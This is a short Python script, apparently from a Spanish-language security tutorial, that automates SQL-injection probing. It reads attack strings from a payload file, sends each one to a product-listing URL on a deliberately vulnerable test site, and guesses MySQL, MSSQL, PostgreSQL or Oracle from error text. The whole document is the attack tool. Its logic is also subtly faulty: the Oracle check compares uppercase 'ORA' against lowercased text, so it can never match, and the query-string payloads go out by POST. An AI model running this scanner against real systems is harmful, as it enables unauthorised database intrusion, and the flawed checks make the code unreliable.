# Importar la librería requests para manejar las solicitudes HTTP.
import requests

# URL del sitio web de prueba que se evaluará para inyección SQL.
url = "http://testphp.vulnweb.com/listproducts.php?cat="

# Lista para almacenar los payloads de inyección SQL que se probarán.
sql_payloads = []

# Leer los vectores de ataque desde un archivo llamado 'sql-attack-vector.txt'.
# Cada línea del archivo se considera un payload potencial.
with open('sql-attack-vector.txt', 'r') as filehandle:
    for line in filehandle:
        sql_payload = line[:-1]  # Eliminar el salto de línea al final de cada línea.
        sql_payloads.append(sql_payload)  # Agregar el payload a la lista.

# Probar cada payload en la lista contra la URL proporcionada.
for payload in sql_payloads:
    print("Testing " + url + payload)  # Mostrar en consola el payload que se está probando.
    
    # Realizar una solicitud HTTP POST con el payload añadido a la URL.
    response = requests.post(url + payload)
    
    # Evaluar el contenido de la respuesta para identificar el tipo de base de datos
    # vulnerable a inyección SQL según los errores específicos que retorne.
    if "mysql" in response.text.lower(): 
        # Detectar errores relacionados con MySQL.
        print("Injectable MySQL detected, attack string: " + payload)
    elif "native client" in response.text.lower():
        # Detectar errores relacionados con MSSQL.
        print("Injectable MSSQL detected, attack string: " + payload)
    elif "syntax error" in response.text.lower():
        # Detectar errores relacionados con PostgreSQL.
        print("Injectable PostGRES detected, attack string: " + payload)
    elif "ORA" in response.text.lower():
        # Detectar errores relacionados con Oracle Database.
        print("Injectable Oracle database detected, attack string: " + payload)
    else:
        # Si no se detecta vulnerabilidad con el payload actual, imprimir mensaje informativo.
        print("Payload ", payload, " not injectable")
